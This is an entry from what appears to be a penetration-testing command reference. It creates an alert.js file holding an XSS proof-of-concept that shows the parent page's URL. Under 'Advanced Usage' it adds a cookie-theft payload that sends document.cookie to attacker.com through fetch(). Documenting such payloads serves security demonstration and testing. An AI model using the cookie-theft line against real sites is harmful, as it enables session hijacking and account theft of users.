---
data: 'echo "alert(''Hello: '' + window.parent.location.href);" > alert.js'
tags:
  - javascript
  - xss
type: command
executor: bash
platforms:
  - Linux
id: fa5f5f54-e026-42b0-8cee-64bf6fde99ae
created_at: '2025-12-13T23:52:43.645Z'
updated_at: '2025-12-13T23:52:43.645Z'
verified: false
validated: true
submitted: true
---
# create-alert-js-file

## Command

```bash
echo "alert('Hello: ' + window.parent.location.href);" > alert.js
```

## Description

This command creates a simple alert.js file with JavaScript that displays an alert including the parent window's URL, useful for demonstrating XSS impact.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | Fixed payload for URL exfiltration | Yes |

## Examples

### Basic Usage

```bash
echo "alert('Hello: ' + window.parent.location.href);" > alert.js
```

### Advanced Usage

For cookie theft:

```bash
echo "fetch('https://attacker.com?cookie=' + document.cookie);" > alert.js
```

## Expected Output

Creates alert.js file with the JS code; when executed, shows alert with current URL.

## Related

- [[Related Procedure]]
